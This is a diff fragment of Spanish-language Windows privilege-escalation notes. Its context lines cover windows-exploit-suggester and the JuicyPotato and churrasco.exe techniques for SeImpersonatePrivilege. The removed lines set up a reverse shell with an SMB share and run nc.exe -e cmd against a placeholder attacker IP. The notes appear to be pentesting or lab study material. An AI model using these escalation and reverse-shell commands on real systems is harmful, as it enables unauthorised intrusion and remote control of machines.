@@ -42,9 +42,7 @@ python2 windows-exploit-suggester -d (archivo descargado) -i systeminfo.txt
 
 // privilegios whoami /priv
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled >>> juicipotato privilege escalation (churrasco.exe para sistemas antiguos) (https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/)
-reverse shell: linux: impacket-smbserver netca $(pwd) -smb2support
-               windows: churrasco.exe "\\<ip atacante>\recurso\nc.exe -e cmd <ip atacante> <puerto>"
-               linux: colocarse en escucha
+
 
 
 ######## transferir archivos de linux a windows ###########
